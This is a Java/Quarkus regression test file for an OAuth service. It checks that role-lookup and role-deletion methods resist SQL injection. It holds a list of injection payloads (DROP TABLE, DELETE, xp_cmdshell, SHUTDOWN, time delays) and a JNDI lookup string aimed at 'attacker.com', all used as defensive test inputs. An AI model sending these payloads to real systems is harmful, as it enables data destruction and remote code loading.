package dev.abstratium.abstrauth.service;

import static org.junit.jupiter.api.Assertions.*;

import java.util.UUID;

import org.junit.jupiter.api.Test;

import dev.abstratium.abstrauth.entity.ClientAllowedRole;
import dev.abstratium.abstrauth.non_multitenancy.entity.NonMultitenancyOAuthClient;
import dev.abstratium.abstrauth.non_multitenancy.service.NonMultitenancyAccountRoleService;
import dev.abstratium.abstrauth.non_multitenancy.service.NonMultitenancyClientRoleService;
import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import jakarta.persistence.EntityManager;
import jakarta.transaction.Transactional;

/**
 * Security regression tests for SQL injection via role fields.
 * 
 * Verifies that role names containing SQL metacharacters, comment sequences,
 * and injection patterns are safely handled by the service layer without
 * executing arbitrary SQL.
 * 
 * All service classes use parameterized JPQL queries with setParameter(),
 * which provides inherent protection against SQL injection. These tests verify
 * that protection is functioning correctly.
 */
@QuarkusTest
public class RoleSqlInjectionTest {

    @Inject
    EntityManager em;

    @Inject
    ClientRoleService clientRoleService;

    @Inject
    ClientAllowedRoleService clientAllowedRoleService;

    @Inject
    NonMultitenancyAccountRoleService nonMultitenancyAccountRoleService;

    @Inject
    NonMultitenancyClientRoleService nonMultitenancyClientRoleService;

    // SQL injection payloads that might be attempted
    private static final String[] SQL_INJECTION_PAYLOADS = {
        "'; DROP TABLE T_accounts; --",
        "' OR '1'='1",
        "admin'--",
        "'; DELETE FROM T_accounts WHERE id IS NOT NULL; --",
        "' UNION SELECT * FROM T_accounts --",
        "role'); DROP TABLE T_account_roles; --",
        "test'; UPDATE T_accounts SET email='hacked' WHERE id='1'; --",
        "'; INSERT INTO T_accounts (id, email) VALUES ('hack', 'hack'); --",
        "role' OR 'a'='a",
        "'; SELECT * FROM T_accounts WHERE id = '1' --",
        "role'; EXEC xp_cmdshell('dir'); --",
        "role'/*",
        "role' AND 1=1 --",
        "role' AND 1=2 --",
        "role'; WAITFOR DELAY '0:0:10'--",
        "role'; SHUTDOWN; --",
        "role' | | 'admin",
        "role\"; DROP TABLE T_accounts; --",
        "${jndi:ldap://attacker.com/exploit}",
        "${sys:java.version}",
    };

    private static final String TEST_ORG_ID = "00000000-0000-0000-0000-000000000000";

    /**
     * Test that role strings with SQL metacharacters passed to cascade deletion
     * methods do not cause SQL injection.
     */
    @Test
    @Transactional
    public void testNonMultitenancyCascadeDeletionSafeFromSqlInjection() {
        // Test that the cascade deletion methods properly use parameterized queries
        // Even with malicious input, they should execute without error and not modify
        // unrelated data
        
        for (String maliciousRole : SQL_INJECTION_PAYLOADS) {
            // These should execute without throwing exceptions and without
            // executing the embedded SQL as actual SQL commands
            assertDoesNotThrow(() -> {
                nonMultitenancyAccountRoleService.removeRolesForClientAndRole(
                    "nonexistent-client", maliciousRole);
            }, "removeRolesForClientAndRole should handle malicious role safely: " + maliciousRole);

            assertDoesNotThrow(() -> {
                nonMultitenancyAccountRoleService.removeRolesForClientAndRoleOutsideOrg(
                    "nonexistent-client", maliciousRole, TEST_ORG_ID);
            }, "removeRolesForClientAndRoleOutsideOrg should handle malicious role safely: " + maliciousRole);

            assertDoesNotThrow(() -> {
                nonMultitenancyClientRoleService.removeClientRolesForTargetAndRole(
                    "nonexistent-client", maliciousRole);
            }, "removeClientRolesForTargetAndRole should handle malicious role safely: " + maliciousRole);

            assertDoesNotThrow(() -> {
                nonMultitenancyClientRoleService.removeClientRolesForTargetAndRoleOutsideOrg(
                    "nonexistent-client", maliciousRole, TEST_ORG_ID);
            }, "removeClientRolesForTargetAndRoleOutsideOrg should handle malicious role safely: " + maliciousRole);
        }
    }

    /**
     * Test that findBySrcTargetAndRole properly uses parameterized queries
     * for the role parameter.
     */
    @Test
    @Transactional
    public void testClientRoleFindBySrcTargetAndRoleSafeFromSqlInjection() {
        for (String maliciousRole : SQL_INJECTION_PAYLOADS) {
            assertDoesNotThrow(() -> {
                // This should return empty optional, not throw SQL exception
                // or execute malicious SQL
                var result = clientRoleService.findBySrcTargetAndRole(
                    "nonexistent-src", "nonexistent-target", maliciousRole);
                assertTrue(result.isEmpty());
            }, "findBySrcTargetAndRole should handle malicious role safely: " + maliciousRole);
        }
    }

    /**
     * Test that ClientAllowedRole lookup methods properly use parameterized queries.
     */
    @Test
    @Transactional  
    public void testClientAllowedRoleServiceSafeFromSqlInjection() {
        for (String maliciousRole : SQL_INJECTION_PAYLOADS) {
            assertDoesNotThrow(() -> {
                // isRoleAllowed uses em.find() which is parameterized
                boolean result = clientAllowedRoleService.isRoleAllowed(
                    "nonexistent-client", maliciousRole, TEST_ORG_ID);
                // Should simply return false since role doesn't exist
                assertFalse(result);
            }, "isRoleAllowed should handle malicious role safely: " + maliciousRole);
        }
    }

    /**
     * Test that the database schema itself is protected - verify critical
     * tables still exist after all the injection attempts.
     */
    @Test
    @Transactional
    public void testDatabaseIntegrityAfterInjectionAttempts() {
        // Execute all malicious payloads through various service methods
        for (String maliciousRole : SQL_INJECTION_PAYLOADS) {
            nonMultitenancyAccountRoleService.removeRolesForClientAndRole(
                "test-client", maliciousRole);
            nonMultitenancyClientRoleService.removeClientRolesForTargetAndRole(
                "test-client", maliciousRole);
        }

        // Verify critical tables still exist and are queryable
        // by executing simple count queries
        Long accountCount = em.createQuery(
            "SELECT COUNT(a) FROM Account a", Long.class).getSingleResult();
        assertNotNull(accountCount);

        Long accountRoleCount = em.createQuery(
            "SELECT COUNT(ar) FROM AccountRole ar", Long.class).getSingleResult();
        assertNotNull(accountRoleCount);

        Long clientRoleCount = em.createQuery(
            "SELECT COUNT(cr) FROM ClientRole cr", Long.class).getSingleResult();
        assertNotNull(clientRoleCount);

        Long allowedRoleCount = em.createQuery(
            "SELECT COUNT(car) FROM ClientAllowedRole car", Long.class).getSingleResult();
        assertNotNull(allowedRoleCount);
    }

    /**
     * Test that role names are stored as literal strings even when they
     * contain characters that might be interpreted as SQL.
     * Uses NonMultitenancyOAuthClient to bypass tenant restrictions.
     */
    @Test
    @Transactional
    public void testRoleNameStoredAsLiteralString() {
        String roleWithQuotes = "role'with'quotes";
        String roleWithComments = "role/*comment*/test";
        String roleWithSemicolon = "role;with;semicolons";
        String clientId = "test-literal-" + System.currentTimeMillis() + "-" + Math.abs(UUID.randomUUID().hashCode());

        // Create a test client using NonMultitenancyOAuthClient
        NonMultitenancyOAuthClient client = new NonMultitenancyOAuthClient();
        client.setClientId(clientId);
        client.setClientName("Test Client");
        client.setClientType("confidential");
        client.setOrgId(TEST_ORG_ID);
        client.setRedirectUris("[]");
        client.setAllowedScopes("[]");
        em.persist(client);

        // Create allowed roles with special characters
        ClientAllowedRole allowedRole1 = new ClientAllowedRole();
        allowedRole1.setClientId(clientId);
        allowedRole1.setRole(roleWithQuotes);
        allowedRole1.setIsDefault(false);
        allowedRole1.setAvailableToForeignOrgs(true);
        em.persist(allowedRole1);

        ClientAllowedRole allowedRole2 = new ClientAllowedRole();
        allowedRole2.setClientId(clientId);
        allowedRole2.setRole(roleWithComments);
        allowedRole2.setIsDefault(false);
        allowedRole2.setAvailableToForeignOrgs(true);
        em.persist(allowedRole2);

        ClientAllowedRole allowedRole3 = new ClientAllowedRole();
        allowedRole3.setClientId(clientId);
        allowedRole3.setRole(roleWithSemicolon);
        allowedRole3.setIsDefault(false);
        allowedRole3.setAvailableToForeignOrgs(true);
        em.persist(allowedRole3);

        em.flush();

        // Verify they were stored as exact literal strings
        ClientAllowedRole found1 = em.find(ClientAllowedRole.class,
            new ClientAllowedRole.Id(clientId, roleWithQuotes));
        assertNotNull(found1, "Role with quotes should be stored");
        assertEquals(roleWithQuotes, found1.getRole());

        ClientAllowedRole found2 = em.find(ClientAllowedRole.class,
            new ClientAllowedRole.Id(clientId, roleWithComments));
        assertNotNull(found2, "Role with comments should be stored");
        assertEquals(roleWithComments, found2.getRole());

        ClientAllowedRole found3 = em.find(ClientAllowedRole.class,
            new ClientAllowedRole.Id(clientId, roleWithSemicolon));
        assertNotNull(found3, "Role with semicolons should be stored");
        assertEquals(roleWithSemicolon, found3.getRole());
    }

    /**
     * Test that isRoleAllowed correctly handles role names containing the
     * composite primary key separator used in ClientAllowedRole.Id.
     */
    @Test
    @Transactional
    public void testIsRoleAllowedWithCompositeKeyLikeStrings() {
        // The Id class uses clientId + role as composite key
        // Ensure this doesn't create injection vectors
        String trickyRole = "admin'); DROP TABLE T_client_allowed_roles; --";

        assertDoesNotThrow(() -> {
            boolean result = clientAllowedRoleService.isRoleAllowed(
                "nonexistent-client", trickyRole, TEST_ORG_ID);
            assertFalse(result);
        });
    }
}
